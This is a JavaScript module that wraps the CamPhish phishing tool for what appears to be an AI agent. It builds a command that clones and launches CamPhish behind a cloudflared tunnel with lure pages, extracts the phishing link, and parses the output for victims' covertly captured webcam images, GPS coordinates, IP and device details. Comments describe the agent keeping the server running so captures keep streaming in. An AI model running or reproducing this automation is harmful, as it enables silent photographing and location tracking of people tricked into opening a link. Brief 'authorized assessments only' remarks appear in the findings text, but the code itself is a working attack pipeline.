// CamPhish — webcam-grab + geolocation phishing tool (techchipnet/CamPhish). It hosts a convincing page
// (Festival Wishing / Live YouTube TV / Online Meeting) behind a public cloudflared tunnel; when a target
// opens the link and allows CAMERA (and optionally location), it silently snaps front-camera shots (saved as
// cam<ts>.png) and captures their GPS coordinates + IP. Like Hound, it's a LONG-LIVED server, so the agent
// runs it as a PERSISTENT background job — the link stays alive and captures stream in as the victim engages.

export const CAMPHISH_TEMPLATES = {
  1: 'Festival Wishing',
  2: 'Live YouTube TV',
  3: 'Online Meeting',
};

export function detectCamphish(command = '') {
  return /\bcamphish\b|CamPhish|trycloudflare/i.test(command);
}

export function pickTemplate(query) {
  const q = String(query || '').toLowerCase();
  const n = parseInt(q, 10);
  if (CAMPHISH_TEMPLATES[n]) return n;
  if (/youtube|live.?tv|\byt\b/.test(q)) return 2;
  if (/meeting|zoom|meet|call/.test(q)) return 3;
  return 1; // Festival Wishing (default)
}

// Persistent launch command: install deps -> clone -> choose port-forwarding (1 = cloudflared) + template,
// then run (serves + waits for targets = job stays alive; captured cam shots/GPS stream in).
export function buildCamphishCommand(template = 1) {
  const t = CAMPHISH_TEMPLATES[template] ? template : 1;
  return [
    'command -v php >/dev/null 2>&1 || { apt-get update -y >/dev/null 2>&1; apt-get install -y php-cli wget unzip git >/dev/null 2>&1; };',
    '[ -d "$HOME/CamPhish" ] || git clone --depth 1 https://github.com/techchipnet/CamPhish "$HOME/CamPhish" >/dev/null 2>&1;',
    'cd "$HOME/CamPhish" || exit 1;',
    'rm -f cam*.png LocationLog.log .cloudflared.log ip.txt 2>/dev/null;',
    // port-forwarding option 2 = Cloudflared (1 is Ngrok which needs an authtoken), then template, then a newline
    `printf '2\\n${t}\\n\\n' | bash camphish.sh`,
  ].join(' ');
}

export function extractCamphishLink(output) {
  const m = /(https:\/\/[-0-9a-z]+\.trycloudflare\.com)/i.exec(String(output || ''));
  return m ? m[1] : null;
}

// Parse CamPhish output -> findings: captured webcam shots (critical), GPS (critical), device/IP (medium).
export function parseCamphish(command, output) {
  if (!detectCamphish(command) || !output) return [];
  const t = String(output);
  const out = [];
  // captured camera shots — cam<ts>.png files / "cam shot" announcements
  const cams = [...t.matchAll(/\b(cam[\w.-]*\.png)\b/gi)].map((m) => m[1]);
  if (cams.length || /cam(?:era)? shot|picture captured|image captured|snap/i.test(t)) {
    const uniq = [...new Set(cams)];
    out.push({
      finding_type: 'access', severity: 'critical', source: 'camphish',
      title: `Webcam shot captured from the target${uniq.length ? `: ${uniq.slice(0, 3).join(', ')}` : ''}`,
      evidence: (uniq.length ? uniq.join(', ') : t.match(/.{0,80}cam.{0,80}/i)?.[0] || 'camera image captured').slice(0, 200),
      remediation: "The target's front camera was silently triggered via a browser permission prompt — never grant camera to untrusted links. Authorized social-engineering assessments only.",
    });
  }
  // GPS
  const lat = /Latitude\s*[:=]?\s*(-?\d{1,3}\.\d+)/i.exec(t);
  const lon = /Longitude\s*[:=]?\s*(-?\d{1,3}\.\d+)/i.exec(t);
  if (lat && lon) {
    out.push({
      finding_type: 'osint', severity: 'critical', source: 'camphish',
      title: `Target GPS location captured: ${lat[1]}, ${lon[1]}`,
      evidence: `https://www.google.com/maps?q=${lat[1]},${lon[1]}`,
      remediation: 'Precise location leaked via a browser prompt — authorized tracking only.',
    });
  }
  // device / IP intel
  const intel = [];
  for (const [re, label] of [
    [/(?:Public IP|IP)\s*[:=]?\s*((?:\d{1,3}\.){3}\d{1,3})/i, 'IP'],
    [/(?:Operating System|Platform|OS)\s*[:=]\s*(.+)/i, 'OS'],
    [/(?:Browser)\s*[:=]\s*(.+)/i, 'Browser'],
    [/(?:ISP|Org)\s*[:=]\s*(.+)/i, 'ISP'],
  ]) { const m = re.exec(t); if (m) intel.push(`${label}: ${m[1].trim().slice(0, 60)}`); }
  if (intel.length) out.push({ finding_type: 'osint', severity: 'medium', source: 'camphish', title: `Target device/network intel captured (${intel.length} fields)`, evidence: intel.join(' · ').slice(0, 300) });

  if (/Target opened the link/i.test(t) && !out.length) out.push({ finding_type: 'osint', severity: 'info', source: 'camphish', title: 'A target opened the CamPhish link', evidence: t.slice(0, 160) });
  const seen = new Set();
  return out.filter((f) => (seen.has(f.title) ? false : seen.add(f.title)));
}
